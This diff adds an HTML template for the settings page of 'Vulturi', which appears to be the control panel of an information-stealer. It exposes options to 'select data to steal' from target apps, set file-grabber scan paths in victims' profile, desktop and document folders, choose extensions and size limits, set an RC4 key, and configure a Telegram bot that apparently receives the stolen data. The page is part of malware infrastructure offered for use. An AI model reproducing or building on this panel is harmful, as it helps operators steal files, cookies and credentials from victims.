@@ -1,0 +1,238 @@
+<!-- Coded by L1ghtM3n@protonmail.com -->
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Vulturi | Settings</title>
+    <link rel="icon" type="image/png" href="{{ url_for('static', filename='images/favicon.png') }}"/>
+
+    <link href="{{ url_for('static', filename='css/main.css') }}" rel="stylesheet">
+    <link href="{{ url_for('static', filename='css/materialize.css') }}" rel="stylesheet">
+    <link href="{{ url_for('static', filename='css/material-icons.css') }}" rel="stylesheet">
+    
+    <script src="{{ url_for('static', filename='js/settings.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/materialize.js') }}"></script>
+    
+  </head>
+  <body>
+
+    <!-- Account Dropdown Structure -->
+    <ul id="account_dropdown" class="dropdown-content">
+      <li><a href="#"><span class="material-icons mi">admin_panel_settings</span> Logged as: {{ username }}</a></li>
+      <li><a href="settings"><span class="material-icons mi">settings</span> Account settings</a></li>
+      <li><a href="api/logout"><span class="material-icons mi">exit_to_app</span> Log off</a></li>
+    </ul>
+
+    <!-- DESKTOP NAVBAR -->
+    <nav class="black" style="padding: 0px 10px; position: fixed; z-index: 2;">
+      <div class="nav-wrapper">
+          <a href="#" class="brand-logo">
+            <span class="material-icons md-36 mi">visibility</span> Vulturi</a>
+
+          <a href="#" class="sidenav-trigger" data-target="mobile-nav">
+              <span class="material-icons mi">menu</span>
+          </a>
+         
+          <ul class="right hide-on-med-and-down ">
+              <li><a href="dashboard"><span class="material-icons mi">dashboard</span> Dashboard</a></li>
+              <li><a href="statistics"><span class="material-icons mi">pie_chart</span> Statistics</a></li>
+              <li><a href="converter"><span class="material-icons mi">settings_input_svideo</span> Cookie converter</a></li>
+              <li><a href="#" class="dropdown-trigger" data-target="account_dropdown"><span class="material-icons mi">account_circle</span> Account</a></li>
+          </ul> 
+      </div>
+    </nav>
+
+
+    <!-- MOBILE NAVBAR -->
+    <ul class="sidenav" id="mobile-nav">
+      <li><a href="dashboard"><span class="material-icons mi">dashboard</span> Dashboard</a></li>
+      <li><a href="statistics"><span class="material-icons mi">pie_chart</span> Statistics</a></li>
+      <li><a href="converter"><span class="material-icons mi">settings_input_svideo</span> Cookie converter</a></li>
+      <li><a href="settings"><span class="material-icons mi">settings</span> Settings</a></li>
+      <li><a href="api/logout"><span class="material-icons mi">exit_to_app</span> Log off</a></li>
+    </ul> 
+
+    <div class="row" style="position: relative; top: 80px;">
+      <!-- Change password -->
+      <div class="col s12 m6">
+        <div class="card hoverable col s12" style="padding: 40px;">
+          <div class="card-content">
+            <!-- Current password -->
+            <div class="input-field col s12 tooltipped" style="top: 5px;"
+              data-position="left" data-tooltip="Current password">
+              <input id="curr_pwd_input" type="password" class="validate">
+              <label for="curr_pwd_input">Please enter your current password</label>
+            </div>
+            <!-- New password -->
+            <div class="input-field col s12 tooltipped" style="top: 5px;"
+              data-position="left" data-tooltip="New password">
+              <input id="new_pwd_input1" type="password" class="validate">
+              <label for="new_pwd_input1">Please enter your new password</label>
+            </div>
+            <!-- New password confirm -->
+            <div class="input-field col s12 tooltipped" style="top: 5px;"
+              data-position="left" data-tooltip="Repeat new password">
+              <input id="new_pwd_input2" type="password" class="validate">
+              <label for="new_pwd_input2">Please confirm your new password</label>
+            </div>
+            <!-- Change password button -->
+            <a class="btn teal waves-effect waves-green col s12" onclick="ChangePassword();" style="margin-top: 10px;">
+              <span class="material-icons mi left">queue</span>
+              Change password
+            </a>
+          </div>
+        </div>
+      </div>
+
+      
+
+      <!-- Set telegram API bot token -->
+      <div class="col s12 m6">
+        <div class="card hoverable col s12" style="padding: 40px;">
+          <div class="card-content">
+            <!-- Token input -->
+            <div class="input-field col s12 tooltipped" style="top: 5px;"
+              data-position="left" data-tooltip="Telegram bot token">
+              <input value="{{ telegram_token }}" id="telegram_token_input" type="text" class="validate">
+              <label for="telegram_token_input">Please enter your TelegramBOT API token</label>
+            </div>
+            <!-- Chatd ID's input -->
+            <div class="input-field col s12 tooltipped" style="top: 5px;"
+              data-position="left" data-tooltip="Chat ID">
+              <input value="{{ ids_string }}" id="telegram_ids_input" type="text" class="validate">
+              <label for="telegram_ids_input">Please enter your chat id. Example: 123213, 243619, ...</label>
+            </div>
+            <!-- Save token button -->
+            <a class="btn teal waves-effect waves-green col s12" onclick="SetTelegramBot();" style="margin-top: 10px;">
+              <span class="material-icons mi left">flight</span>
+              Save telegram api bot token
+            </a>
+          <!-- Delete token button -->
+          <a class="btn red waves-effect waves-red col s12" onclick="DelTelegramBot();" style="margin-top: 10px;">
+            <span class="material-icons mi left">delete_sweep</span>
+            Delete telegram api bot token
+          </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="row" style="position: relative; top: 80px;">
+      
+      <!-- Change encryption key -->
+        <div class="col s12 m6">
+          <div class="card hoverable col s12" style="padding: 40px;">
+            <div class="card-content">
+            <!-- Current key -->
+            <div class="input-field col s12 tooltipped" style="top: 5px;"
+              data-position="left" data-tooltip="Current encryption key">
+              <input value="{{ rc4_key }}" id="curr_encr_key_input" type="text" class="validate">
+              <label for="curr_encr_key_input">Encryption key</label>
+            </div>
+            <!-- Change encryption key button -->
+            <a class="btn teal waves-effect waves-green col s12" onclick="ChangeEncrypionKey();" style="margin-top: 10px;">
+              <span class="material-icons mi left">vpn_key</span>
+              Change encryption key
+            </a>
+          </div>
+        </div>
+      </div>
+
+       <!-- Toggle stealing apps -->
+       <div class="col s12 m6">
+        <div class="card hoverable col s12" style="padding: 40px;">
+          <div class="card-content">
+            
+            <div class="input-field col s12">
+              <select id="toggle_stealing_options" multiple>
+                {% for app in target_apps_options %}
+                  <option {{ app.checked }} value="{{ app.name }}">{{ app.description }}</option>
+                {% endfor %}
+              </select>
+              <label>Select data to steal</label>
+            </div>
+
+            <!-- Save stealing apps button -->
+            <a class="btn teal waves-effect waves-green col s12" onclick="SaveStealingData();" style="margin-top: 10px;">
+              <span class="material-icons mi left">apps</span>
+              Save apps configuration
+            </a>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="row" style="position: relative; top: 80px;">
+      <!-- TABLE WITH PATHS -->
+      <div class="col s12 m6">
+        <div class="card hoverable">
+          <div class="card-content">
+              <table id="stats_table" class="highlight">
+                  <thead>
+                    <tr>
+                        <th>#</th>
+                        <th><span class="material-icons mi">find_in_page</span> Grabber scanning path</th>
+                        <th><span class="material-icons mi">settings</span> Actions</th>
+                      </tr>
+                  </thead>
+                  <tbody>
+                    {% for i, path in table_paths %}
+                      <tr>
+                        <td>{{ i + 1 }}</td>
+                        <td>{{ path }}</td>
+                        <td>
+                          <!-- DELETE BUTTON -->
+                          <a style="right: 10%; width: 90%;" class="red center accent-4 waves-effect waves-red btn right tooltipped"
+                            data-position="bottom" data-tooltip="Delete path from grabber"
+                            onclick="DeleteGrabberPath('{{ path }}', this);">
+                            <span class="material-icons mi left">delete_forever</span>
+                            Delete
+                          </a>
+                        </td>
+                      </tr>
+                    {% endfor %}
+                  </tbody>
+                
+              </table>
+          </div>
+        </div>
+      </div>
+
+      <div class="col s12 m6">
+        <div class="card hoverable col s12" style="padding: 40px;">
+          <div class="card-content">
+          
+
+            <!-- grabber scanning paths -->
+            <div class="input-field col s12 tooltipped" style="top: 5px;"
+            data-position="left" data-tooltip="Available variables:<br><br>%UserProfile%<br>%RoamingAppdata%<br>%LocalAppdata%<br>%Desktop%<br>%Documents%<br>%Pictures%<br>%SystemDrive%<br>">
+              <input id="path_input" type="text" class="validate">
+              <label for="path_input">New grabber scanning path</label>
+            </div>
+
+            <a class="btn teal waves-effect waves-green col s12" onclick="AddGrabberPath();" style="margin-top: 10px;">
+              <span class="material-icons mi left">queue</span>
+              Add new path
+            </a>
+
+            <!-- grabber extensions textarea -->
+            <textarea id="extensions_area" class="col s12 materialize-textarea" style="margin-top: 50px; margin-left: 10px; width: 97%;">{{ extensions_area }}</textarea>
+            <label for="extensions_area" style="margin-left: 10px;">Grabber extensions list</label>
+            
+            <div class="input-field col s12" style="top: 10px;">
+              <input value="{{ max_file_size }}" id="size_input" type="text" class="validate">
+              <label for="size_input">Max file size in bytes</label>
+            </div>
+
+            <a class="btn teal waves-effect waves-green col s12" onclick="SetExtensions();" style="margin-top: 10px;">
+              <span class="material-icons mi left">save</span>
+              Save extensions list and size
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </body>
+</html>
